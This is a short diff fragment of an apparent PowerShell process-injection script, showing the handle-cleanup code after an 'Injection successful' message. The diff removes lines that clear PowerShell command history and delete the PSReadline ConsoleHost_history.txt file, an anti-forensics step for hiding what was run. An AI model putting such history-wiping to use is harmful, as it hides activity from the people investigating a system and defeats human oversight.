@@ -68,8 +68,3 @@ Write-Host "Injection successful."
 if ($hProc -ne [IntPtr]::Zero) {
     [Injector]::CloseHandle($hProc) | Out-Null
 }
-
-# Clear PowerShell command history
-Clear-History
-
-Remove-Item "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" -ErrorAction SilentlyContinue
